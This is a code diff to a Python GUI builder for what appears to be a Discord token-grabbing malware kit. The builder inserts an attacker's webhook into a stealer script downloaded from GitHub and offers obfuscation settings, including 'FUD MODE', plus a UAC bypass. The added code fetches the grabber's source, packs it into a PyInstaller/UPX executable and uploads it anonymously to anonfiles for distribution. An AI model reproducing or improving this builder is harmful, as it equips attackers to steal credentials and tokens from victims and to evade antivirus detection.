@@ -5,6 +5,10 @@ from random import randint
 import codecs
 import string
 import webbrowser
+import zipfile
+import io
+import shutil
+import time
 
 try:
     import customtkinter as kdot
@@ -23,6 +27,12 @@ try:
 except:
     os.system("pip install requests")
     import requests
+
+try:
+    import PyInstaller
+except:
+    os.system("pip install pyinstaller")
+    import PyInstaller
 
 code = r"""
 @echo off
@@ -76,11 +86,11 @@ class Buidler(kdot.CTk):
         self.hentai_button = kdot.CTkButton(self.navigation_frame, image=self.hentai_image, height=40, border_spacing=10, text="Hentai", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.hentai_button_event)
         self.hentai_button.grid(row=3, column=0, sticky="ew")
         
-        self.appearance_mode_menu = kdot.CTkOptionMenu(self.navigation_frame, values=["Dark", "Light", "System"], command=self.change_appearance_mode_event)
+        self.appearance_mode_menu = kdot.CTkOptionMenu(self.navigation_frame, values=["System", "Light", "Dark"], command=self.change_appearance_mode_event)
         self.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")
         
         self.home_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
-        self.home_frame.grid_columnconfigure(0, weight=1)
+        self.home_frame.grid_columnconfigure((1,4), weight=1)
         
         self.about_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
         self.about_frame.grid_columnconfigure(0, weight=1)
@@ -90,27 +100,29 @@ class Buidler(kdot.CTk):
         
         #webhook stuff
         self.webhook_box_label = kdot.CTkLabel(self.home_frame, text="Webhook URL", text_color=("gray10", "gray90"), anchor="w")
-        self.webhook_box_label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
+        self.webhook_box_label.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
         
-        self.webhook_box = kdot.CTkEntry(self.home_frame, width=300, height=30, corner_radius=10)
-        self.webhook_box.grid(row=0, column=1, pady=10, sticky="n")
+        self.webhook_box = kdot.CTkEntry(self.home_frame, width=500, height=30, corner_radius=10)
+        self.webhook_box.grid(row=0, column=1, pady=10, sticky="nsew", columnspan=2)
         
         self.webhook_check_button = kdot.CTkButton(self.home_frame, text="Check", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60, command=self.webhook_button_check)
-        self.webhook_check_button.grid(row=0, column=2, padx=10, pady=10, sticky="n")
+        self.webhook_check_button.grid(row=0, column=3, padx=10, pady=10, sticky="nsew")
         
         self.obfuscation_label = kdot.CTkLabel(self.home_frame, text="Obfuscation\nLevel --->", text_color=("gray10", "gray90"), anchor="w")
-        self.obfuscation_label.grid(row=1, column=0, sticky="ew", padx=10, pady=10)
-        self.obfuscate_dropdown_box = kdot.CTkOptionMenu(self.home_frame, values=["Level 1", "Level 2", "Level 3", "All", "FUD MODE", "None"])
-        self.obfuscate_dropdown_box.grid(row=1, column=1, padx=10, pady=10)
+        self.obfuscation_label.grid(row=1, column=0, sticky="w", padx=5, pady=0)
+        self.obfuscate_dropdown_box = kdot.CTkOptionMenu(self.home_frame, values=["Level 1", "Level 2", "Level 3", "All", "FUD MODE", "None"], )
+        self.obfuscate_dropdown_box.grid(row=1, column=1, padx=5, pady=5)
         self.uac_bypass_check_box = kdot.CTkCheckBox(self.home_frame, text="UAC Bypass", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
-        self.uac_bypass_check_box.grid(row=1, column=2, padx=10, pady=10, sticky="e")
+        self.uac_bypass_check_box.grid(row=1, column=2, padx=10, pady=10, sticky="n")
+        self.build_own_executable_check_box = kdot.CTkCheckBox(self.home_frame, text="Build own exe", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
+        self.build_own_executable_check_box.grid(row=1, column=3, padx=10, pady=10, sticky="e")
         
         #start button
         self.start_button = kdot.CTkButton(self.home_frame, text="Start", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=80, width=200, command=self.start_button_event)
-        self.start_button.grid(row=2, column=0, columnspan=3, padx=10, pady=10, sticky="n")
+        self.start_button.grid(row=2, column=1, columnspan=2, padx=10, pady=10, sticky="nsew")
         
         self.bottom_image_place = kdot.CTkLabel(self.home_frame, image=self.bottom_image, text="K.Dot#4044", text_color=("black", "black"), anchor="s", font=("Arial", 20))
-        self.bottom_image_place.grid(row=5, column=0, columnspan=3, sticky="n", pady=5)
+        self.bottom_image_place.grid(row=5, column=0, columnspan=4, sticky="n", pady=5, padx=5)
         
         
         #---------------------------------About Frame---------------------------------
@@ -196,10 +208,43 @@ class Buidler(kdot.CTk):
         obfuscate = self.obfuscate_dropdown_box.get()
         uac_bypass = self.uac_bypass_check_box.get()
         webhook = self.webhook_box.get()
+        build_exe = self.build_own_executable_check_box.get()
         self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.bat'
         if uac_bypass == True:
             self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main_with_uac_bypass.bat'
         self.code = requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook)
+        if build_exe == True:
+            self.top_level_warning = kdot.CTkToplevel(self, width=400, height=200)
+            self.top_level_warning.protocol("WM_DELETE_WINDOW", self.top_level_warning.destroy)
+            self.top_level_warning_frame = kdot.CTkFrame(self.top_level_warning, width=400, height=200, bg_color="gray10")
+            self.top_level_warning_frame.pack(fill="both", expand=True)
+            self.top_level_warning_label = kdot.CTkLabel(self.top_level_warning_frame, text="This will take a while, please be patient.", bg_color="gray10", fg_color="gray75", font=("Arial", 20))
+            self.top_level_warning_label.place(relx=0.5, rely=0.5, anchor="center")
+            self.top_level_warning.update()
+            self.top_level_warning.deiconify()
+            self.top_level_warning.update()
+            self.top_level_warning_label.configure(text="THIS IS STILL UNDER DEVELOPMENT!\nFEATURES LIKE BUILD OWN EXE\nMIGHT NOT WORK\nUSE AT OWN RIST")
+            self.top_level_warning.update()
+            time.sleep(5)
+            self.top_level_warning.destroy()
+            py_code = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.py'
+            os.system('pip install pycryptodome pypiwin32')
+            with open("test.py", "w") as f:
+                f.write(requests.get(py_code).text)
+            upx_url = "https://github.com/upx/upx/releases/download/v4.0.1/upx-4.0.1-win64.zip"
+            upx_zip = zipfile.ZipFile(io.BytesIO(requests.get(upx_url).content))
+            upx_zip.extractall()
+            os.system("pyinstaller --onefile --key GODFATHER --clean --upx-dir upx-4.0.1-win64 test.py")
+            os.remove("test.py")
+            os.remove("test.spec")
+            shutil.rmtree("build")
+            shutil.rmtree("upx-4.0.1-win64")
+            print("Uploading!\nThis might take some time!\n")
+            upload_to_anon = requests.post("https://api.anonfiles.com/upload", files={"file": open("dist/test.exe", "rb")})
+            shutil.rmtree("dist")
+            anon_url = upload_to_anon.json()["data"]["file"]["url"]["full"]
+            direct_download_url = anon_url.replace("https://anonfiles.com/", "https://cdn.anonfiles.com/")
+            self.code.replace('https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/test.exe', direct_download_url)
         if obfuscate == "Level 1":
             self.level1()
             self.create_top_level("main.level1.bat is the finished product!")
@@ -225,6 +270,7 @@ class Buidler(kdot.CTk):
     def create_top_level(self, *words):
         window = kdot.CTkToplevel(self)
         window.geometry("500x300")
+        window.title("Finished Product")
         
         label = kdot.CTkLabel(window, text=words[0], text_color=("gray10", "gray90"), anchor="w", font=("Arial", 20))
         label.pack(padx=10, pady=10)
